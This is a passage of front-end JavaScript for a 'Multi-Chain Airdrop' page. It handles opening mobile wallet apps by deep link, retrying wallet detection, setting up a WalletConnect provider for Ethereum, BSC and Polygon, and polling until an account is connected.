        const instruction = walletInstructions[walletName] || `${walletName} app should open. Connect your wallet and return to this page.`;
        
        let browserSpecificNote = '';
        if (mobileBrowser === 'safari') {
            browserSpecificNote = '\n\nNote: Safari may ask to open the app. Tap "Open" to continue.';
        } else if (mobileBrowser === 'chrome') {
            browserSpecificNote = '\n\nNote: Chrome may ask permission to open the app. Tap "Open" to continue.';
        } else if (mobileBrowser === 'firefox') {
            browserSpecificNote = '\n\nNote: Firefox may block the deep link. Try copying the URL and opening it manually.';
        }
        
        alert(`Opening ${walletName} mobile app...\n\n${instruction}\n\nIf the app doesn't open:\n1. Make sure ${walletName} is installed\n2. Try refreshing this page\n3. Some browsers may block deep links${browserSpecificNote}`);
        
        // Enhanced wallet detection with retry mechanism
        let detectionAttempts = 0;
        const maxDetectionAttempts = 3;
        
        const checkForWallet = () => {
            detectionAttempts++;
            updateConnectionStatus(`Checking for wallet connection... (${detectionAttempts}/${maxDetectionAttempts})`);
            
            // Check if any wallet became available
            const availableWallets = Object.keys(WALLET_DEFINITIONS).filter(key => {
                try {
                    return WALLET_DEFINITIONS[key].detect();
                } catch (error) {
                    return false;
                }
            });
            
            if (availableWallets.length > 0) {
                updateConnectionStatus("Mobile wallet detected! Please click connect again.");
                console.log("Available wallets after mobile app:", availableWallets);
                
                // Auto-populate the dropdown if a matching wallet is found
                const matchingWallet = availableWallets.find(wallet => 
                    wallet.toLowerCase().includes(walletName.replace(' wallet', '')) || 
                    walletName.includes(wallet.toLowerCase())
                );
                
                if (matchingWallet) {
                    $('#wallet-select').val(matchingWallet);
                    selectedWallet = matchingWallet;
                    updateWalletStatus();
                    
                    // Show success message
                    updateConnectionStatus(`${WALLET_DEFINITIONS[matchingWallet].name} detected! Ready to connect.`);
                }
                
                return; // Stop checking
            } else {
                if (detectionAttempts < maxDetectionAttempts) {
                    // Try again after delay
                    setTimeout(checkForWallet, 3000);
                } else {
                    updateConnectionStatus("Please connect your mobile wallet and try again.");
                    console.log("No wallets detected after mobile app interaction");
                }
            }
        };
        
        // Start checking after initial delay
        setTimeout(checkForWallet, 5000);
    }

    // WalletConnect connection handler
    async function handleWalletConnectConnection(selected) {
        if (!walletConnectAvailable || !WalletConnectProvider) {
            throw new Error("WalletConnect not available");
        }

        const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
        const provider = await WalletConnectProvider.init({
            projectId: PROJECT_ID,
            chains: [1, 56, 137],
            showQrModal: true,
            metadata: {
                name: "Multi-Chain Airdrop",
                description: "Claim your multi-chain airdrop tokens",
                url: window.location.origin,
                icons: ["https://walletconnect.com/walletconnect-logo.png"]
            }
        });

        await provider.connect();
        
        if (!provider.accounts || provider.accounts.length === 0) {
            throw new Error("No accounts connected via WalletConnect");
        }

        updateConnectionStatus("WalletConnect connected successfully!");
        
        // Handle as EVM wallet
        await handleEVMConnection({ 
            name: "WalletConnect", 
            provider: provider, 
            networks: ["ethereum", "bsc", "polygon"] 
        });
    }

    // Wait for wallet connection
    async function waitForConnection(timeout = 30000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            const checkInterval = 1000;
            
            const checkConnection = async () => {
                try {
                    if (window.ethereum) {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            resolve(true);
                            return;
                        }
                    }
                } catch (error) {
                    console.log("Still waiting for connection...");
                }
                
                if (Date.now() - startTime > timeout) {
                    resolve(false);
                    return;
                }
                
                setTimeout(checkConnection, checkInterval);
            };
            
            checkConnection();
        });
    }
});